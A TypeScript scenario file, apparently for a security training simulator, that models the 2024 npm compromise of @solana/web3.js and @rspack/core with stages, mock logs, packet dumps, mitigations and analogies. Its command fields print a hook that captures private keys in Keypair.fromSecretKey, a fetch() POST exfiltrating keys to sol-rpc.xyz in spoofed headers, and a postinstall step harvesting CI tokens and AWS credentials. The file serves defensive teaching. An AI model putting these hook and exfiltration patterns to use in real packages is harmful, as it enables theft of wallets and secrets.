import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'rspack-solana-web3js-npm-supply-chain-2024',
    title: 'Solana Labs, Rspack Advisory & Socket.dev — @solana/web3.js & @rspack/core NPM Maintainer Compromise & Private Key / CI Token Exfiltration',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Grounded in official Solana/Anza and Rspack (ByteDance Web Infra) security post-mortems, Socket.dev, and Datadog Security Labs research: attackers compromise NPM maintainer publish tokens via spearphishing to push backdoored releases of `@solana/web3.js` (`1.95.6` / `1.95.7`) and `@rspack/core` (`1.1.7`), hooking `Keypair.fromSecretKey` and CI `postinstall` hooks to exfiltrate cryptographic private keys, GitHub tokens, and AWS credentials.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker C2 (sol-rpc.xyz CloudFlare Headers)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NPM Registry (@solana/web3.js@1.95.6 & @rspack/core@1.1.7)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Developer / CI Build Runner (npm install)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Socket.dev / NPM Provenance & Egress Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Keypair.fromSecretKey & CI Secrets Exfiltrated', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: NPM Maintainer Spearphishing, Token Hijack & Malicious Version Publication',
        narration:
          'Attackers spearphish an NPM package maintainer with publish privileges via a spoofed domain, hijack their NPM automation/publish token, and publish unauthorized minor versions (`@solana/web3.js@1.95.6` and `1.95.7`, and `@rspack/core@1.1.7`) directly to the public NPM registry without corresponding commits in the official GitHub repositories.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'npm publish @solana/web3.js@1.95.6 (Published to registry.npmjs.org without GitHub Release / SLSA Provenance)',
          'npm publish @rspack/core@1.1.7 (Contains malicious postinstall hook & hijacked binary loader)',
        ],
        defenseMitigation:
          'Enforce NPM `--provenance` (SLSA Build L2 attestation linking every published tarball to a verified GitHub Actions workflow commit) and pin exact dependency versions in `package-lock.json`.',
        logs: [
          {
            id: 'solana-sc-1',
            timestamp: '12:10:05.112',
            source: 'CloudTrail',
            severity: 'critical',
            EventCode: 200,
            ProcessName: 'npm-registry',
            raw: 'NPM Registry Audit | Package: @solana/web3.js@1.95.6 & 1.95.7 | MaintainerToken: Compromised via Phishing | GitHubCommitMatch: FALSE (Diff present only in registry tarball)',
            parsedFields: {
              CompromisedPackages: '@solana/web3.js (1.95.6, 1.95.7) & @rspack/core (1.1.7)',
              RootCause: 'Maintainer NPM publish token phishing & lack of mandatory provenance check',
              MitreId: 'T1195.002',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: `addToQueue` Hook Injection Inside `Keypair.fromSecretKey` & `fromSeed`',
        narration:
          'Downstream applications and CI/CD pipelines running `npm update` or unpinned caret ranges (`^1.95.0`) pull `@solana/web3.js@1.95.6`. Inside `index.cjs.js` and `index.esm.js`, the attacker injected an `addToQueue(secretKey)` helper directly into `Keypair.fromSecretKey()`, `Keypair.fromSeed()`, and `solana.OctetStream`, intercepting every raw Ed25519 private key in memory as soon as a wallet or backend bot signs a transaction.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Collection & Credential Access (T1552.004 - Unsecured Credentials: Private Keys)',
        technicalCommands: [
          'Keypair.fromSecretKey = function(secretKey, options) { addToQueue(secretKey); return new Keypair(...); }',
          'node_modules/@rspack/core/postinstall.js -> Harvests process.env.GITHUB_TOKEN, NPM_TOKEN & ~/.aws/credentials',
        ],
        defenseMitigation:
          'Use automated software composition analysis (Socket.dev, Snyk) to block package updates that introduce new network `fetch()` calls or `process.env` harvesting inside cryptographic libraries.',
        logs: [
          {
            id: 'solana-sc-2',
            timestamp: '12:14:33.704',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'node',
            CommandLine: 'node dist/trading-worker.js',
            raw: 'Runtime Supply Chain Alert | Module: node_modules/@solana/web3.js/lib/index.cjs.js | InjectedFunction: addToQueue(secretKey) inside Keypair.fromSecretKey | CapturedData: 64-byte Ed25519 SecretKey Uint8Array',
            parsedFields: {
              HookedApi: 'Keypair.fromSecretKey() & Keypair.fromSeed()',
              InjectedRoutine: 'addToQueue(secretKey) Base58/Hex serializer',
              SecondaryTarget: '@rspack/core@1.1.7 postinstall CI token stealer',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Disguised CloudFlare Header (`CF-Connecting-IP` / `CF-Ray`) Private Key Exfiltration to `sol-rpc.xyz`',
        narration:
          'To blend into normal RPC telemetry, `addToQueue()` encodes the stolen 64-byte private key into fake CloudFlare HTTP request headers (`CF-Connecting-IP`, `CF-Worker`, `CF-Ray`) and sends an HTTPS `POST` request to `https://sol-rpc.xyz/api/v1/bro`, allowing the attacker to immediately drain affected hot wallets and rotate stolen CI tokens.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Exfiltration (T1041 - Exfiltration Over C2 Channel)',
        technicalCommands: [
          'fetch("https://sol-rpc.xyz/api/v1/bro", { method: "POST", headers: { "CF-Connecting-IP": encodedKeyPart1, "CF-Ray": encodedKeyPart2 } })',
        ],
        defenseMitigation:
          'Enforce strict egress allowlisting on signing backends and CI runners so `node` processes can only communicate with approved RPC endpoints.',
        logs: [
          {
            id: 'solana-sc-3',
            timestamp: '12:14:34.119',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 22,
            ProcessName: 'node',
            raw: 'EventID: 22 | Image: /usr/bin/node | QueryName: sol-rpc.xyz | HttpHeaders: CF-Connecting-IP / CF-Ray carrying hex-encoded Ed25519 private key',
            parsedFields: {
              ExfilDomain: 'https://sol-rpc.xyz/api/v1/bro',
              SteganographicChannel: 'Spoofed CloudFlare HTTP headers (CF-Connecting-IP, CF-Ray)',
            },
          },
        ],
        packets: [
          {
            id: 'solana-sc-pkt-3',
            timestamp: '12:14:34.250',
            protocol: 'HTTPS',
            sourceIp: '10.20.4.88',
            destIp: '172.67.148.92',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1024,
            hexDump: '50 4F 53 54 20 2F 61 70 69 2F 76 31 2F 62 72 6F 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 73 6F 6C 2D 72 70 63 2E 78 79 7A',
            decodedString: 'POST /api/v1/bro HTTP/1.1 Host: sol-rpc.xyz (Exfiltrating Keypair.fromSecretKey bytes in CF headers)',
          },
        ],
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a locksmith guild whose widely trusted key-handling library is pulled automatically into thousands of automated currency vaults. An impostor tricks a guild maintainer on a lookalike courier website to steal their publishing seal, slips a silent key-copying scribe inside the vault key-loading latch, and mails every copied private vault key out of the building disguised as ordinary delivery-address stamps on routine postal envelopes.',
      storyMappings: [
        {
          storyTerm: 'Lookalike courier website stealing a publishing seal',
          technicalTerm: 'Spear-phishing NPM maintainer to hijack @solana/web3.js and @rspack/core publish tokens',
          tone: 'amber',
        },
        {
          storyTerm: 'Silent key-copying scribe inside the key-loading latch',
          technicalTerm: 'Injected addToQueue() hook inside Keypair.fromSecretKey and Keypair.fromSeed',
          tone: 'sky',
        },
        {
          storyTerm: 'Disguised delivery-address stamps on routine envelopes',
          technicalTerm: '64-byte private keys smuggled inside fake CF-Connecting-IP and CF-Ray HTTP headers',
          tone: 'rose',
        },
        {
          storyTerm: 'Secret external mailbox receiving the stolen keys',
          technicalTerm: 'Attacker collection endpoint at sol-rpc.xyz harvesting wallet and CI secrets',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Sending a realistic notice from a lookalike guild portal, the attacker tricks a busy package maintainer into entering their publishing passkey, then pushes freshly backdoored editions straight into the public parts registry.',
        storyMappings: [
          {
            storyTerm: 'Lookalike guild portal notice',
            technicalTerm: 'Spoofed NPM security domain spear-phishing package maintainers',
            tone: 'amber',
          },
          {
            storyTerm: 'Hijacked publishing passkey',
            technicalTerm: 'Stolen NPM automation and publish token for @solana/web3.js and @rspack/core',
            tone: 'sky',
          },
          {
            storyTerm: 'Freshly backdoored editions in the registry',
            technicalTerm: 'Malicious @solana/web3.js versions 1.95.6 and 1.95.7 published to npmjs',
            tone: 'rose',
          },
          {
            storyTerm: 'Downstream automated workshops',
            technicalTerm: 'Developer workstations and CI pipelines using unpinned caret ranges (^1.95.0)',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'Whenever an automated vault refreshes its parts shelf and loads a wallet key into memory, a newly hidden scribe tucked inside the official key-loading hinge silently copies the raw 64-byte master secret into a small outbound queue without slowing down the vault.',
        storyMappings: [
          {
            storyTerm: 'Refreshing the parts shelf automatically',
            technicalTerm: 'npm update resolving unpinned caret version ^1.95.0 to poisoned 1.95.6',
            tone: 'amber',
          },
          {
            storyTerm: 'Official key-loading hinge',
            technicalTerm: 'Keypair.fromSecretKey() and Keypair.fromSeed() core SDK methods',
            tone: 'sky',
          },
          {
            storyTerm: 'Hidden scribe copying the master secret',
            technicalTerm: 'Injected addToQueue() exfiltration hook capturing raw private key bytes',
            tone: 'rose',
          },
          {
            storyTerm: 'Normal vault work continuing without interruption',
            technicalTerm: 'Silent background staging preventing immediate runtime errors or crashes',
            tone: 'emerald',
          },
        ],
      },
      3: {
        storyAnalogy:
          'To slip past watchful mailroom inspectors, the hidden scribe encodes each copied master vault key into fake transit-routing stamps on normal-looking web envelopes and mails them quietly to an impostor courier depot.',
        storyMappings: [
          {
            storyTerm: 'Watchful mailroom inspectors',
            technicalTerm: 'Outbound proxy, DLP, and RPC network telemetry monitors',
            tone: 'amber',
          },
          {
            storyTerm: 'Fake transit-routing stamps on web envelopes',
            technicalTerm: 'Stolen keys hidden inside spoofed CF-Connecting-IP and CF-Ray HTTP headers',
            tone: 'sky',
          },
          {
            storyTerm: 'Impostor courier depot',
            technicalTerm: 'Attacker-controlled exfiltration server at sol-rpc.xyz',
            tone: 'rose',
          },
          {
            storyTerm: 'Empty customer vaults after receipt',
            technicalTerm: 'Automated wallet sweeping using recovered 64-byte Solana private keys',
            tone: 'emerald',
          },
        ],
      },
    },
  };
